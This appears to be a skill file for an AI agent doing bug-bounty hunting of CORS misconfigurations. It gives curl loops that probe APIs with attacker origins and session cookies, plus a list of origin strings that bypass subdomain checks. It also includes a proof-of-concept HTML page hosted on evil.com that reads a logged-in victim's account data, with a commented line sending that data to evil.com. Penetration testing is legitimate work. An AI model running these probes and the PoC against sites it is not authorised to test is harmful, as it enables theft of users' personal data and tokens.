---
name: hunt-cors
description: Hunt CORS Misconfiguration — wildcard with credentials, null origin, regex with subdomain trust, pre-flight bypass, postMessage origin checks. High when it leads to credentialed data theft. Use when testing API endpoints, SPAs, or any app with Access-Control headers.
sources: hackerone_public
report_count: 19
---

# HUNT-CORS — Cross-Origin Resource Sharing Misconfiguration

## Crown Jewel Targets

CORS bugs pay High when they allow an attacker-controlled origin to read sensitive authenticated responses.

**Highest-value chains:**
- **Reflect-any-origin with credentials** — server echoes Origin header + `Access-Control-Allow-Credentials: true` → any site reads authed API responses
- **Null origin trust** — `Access-Control-Allow-Origin: null` trusted, sandbox iframe sends null-origin requests
- **Subdomain regex bypass** — trusted regex `^https?://.*\.target\.com$` → `attacker.target.com.evil.com` bypasses
- **Subdomain takeover + CORS** — dangling subdomain → takeover → use as trusted origin
- **postMessage missing origin check** — `window.addEventListener('message',...)` without checking `event.origin`

---

## Attack Surface Signals

```
Any endpoint returning Access-Control-Allow-Origin header
API endpoints: /api/*, /v1/*, /graphql
Profile/account: /api/me, /api/profile, /api/user
Financial: /api/balance, /api/transactions
Admin: /api/admin/*, /api/internal/*
```

---

## Step-by-Step Hunting Methodology

### Phase 1 — Discover CORS Endpoints
```bash
# Probe all API endpoints for CORS headers
cat recon/$TARGET/api-endpoints.txt | while read url; do
  result=$(curl -s -I "$url" \
    -H "Origin: https://evil.com" \
    -H "Cookie: $SESSION_COOKIE" | \
    grep -i "access-control")
  [ -n "$result" ] && echo "$url: $result"
done

# httpx bulk check
cat recon/$TARGET/live-hosts.txt | awk '{print $1}' | \
  httpx -H "Origin: https://evil.com" -match-string "access-control-allow-origin"
```

### Phase 2 — Test Reflect-Any-Origin
```bash
# Does server reflect the Origin header?
curl -s -I https://$TARGET/api/me \
  -H "Origin: https://evil.com" \
  -H "Cookie: $SESSION_COOKIE" | grep -i "access-control"

# Vulnerable response:
# Access-Control-Allow-Origin: https://evil.com   ← reflects back
# Access-Control-Allow-Credentials: true           ← credentials allowed

# Test null origin
curl -s -I https://$TARGET/api/me \
  -H "Origin: null" \
  -H "Cookie: $SESSION_COOKIE" | grep -i "access-control"
```

### Phase 3 — Test Subdomain Regex Bypass
```bash
# If *.target.com is trusted, try bypasses
for ORIGIN in \
  "https://evil.target.com" \
  "https://target.com.evil.com" \
  "https://nottarget.com" \
  "https://EVIL.target.com" \
  "https://evil%60target.com" \
  "http://target.com"; do
  RESULT=$(curl -s -I https://$TARGET/api/me \
    -H "Origin: $ORIGIN" \
    -H "Cookie: $SESSION_COOKIE" | grep -i "access-control-allow-origin")
  echo "$ORIGIN → $RESULT"
done
```

### Phase 4 — PoC HTML
```html
<!-- Host on evil.com, open in browser while logged into target -->
<html><body>
<div id="out"></div>
<script>
fetch("https://TARGET/api/me", {credentials: "include"})
  .then(r => r.json())
  .then(d => {
    document.getElementById("out").innerText = JSON.stringify(d);
    // Exfil: fetch("https://evil.com/log?d=" + encodeURIComponent(JSON.stringify(d)));
  });
</script>
</body></html>
```

### Phase 5 — postMessage Check
```bash
# Grep JS files for postMessage handlers without origin check
grep -r "addEventListener.*message" recon/$TARGET/ --include="*.js" | \
  grep -v "event.origin"
# Look for handlers that process data without origin validation
```

---

## Automation
```bash
# corsy
pip3 install corsy
corsy -u https://$TARGET -t 10 --headers "Cookie: $SESSION_COOKIE"

# nuclei CORS templates
nuclei -u https://$TARGET -t cors/

# Manual bulk scan
while read url; do
  result=$(curl -sI "$url" -H "Origin: https://evil.com" \
    | grep -i "access-control-allow-origin")
  [ -n "$result" ] && echo "$url: $result"
done < recon/$TARGET/api-endpoints.txt
```

---

## Chain Table

| CORS finding | Chain to | Impact |
|-------------|----------|--------|
| Reflects any origin + credentials | Read /api/me, /api/tokens | PII theft, token exfil |
| Trusted subdomain with XSS | XSS → CORS read authed endpoints | Critical combined impact |
| Subdomain takeover available | Register subdomain → use as trusted origin | Full credentialed read |
| postMessage no origin check | Inject malicious iframe | Arbitrary message injection |

---

## Validation

✅ Confirmed: `Access-Control-Allow-Origin` echoes attacker origin AND `Access-Control-Allow-Credentials: true`
✅ PoC: JavaScript on attacker domain reads authenticated API response with victim's data

**Severity:**
- Reflects any origin + credentials + sensitive data: High
- Reflects any origin, no credentials: Low
- Null origin + sensitive endpoint: Medium
- Subdomain takeover chain: High/Critical
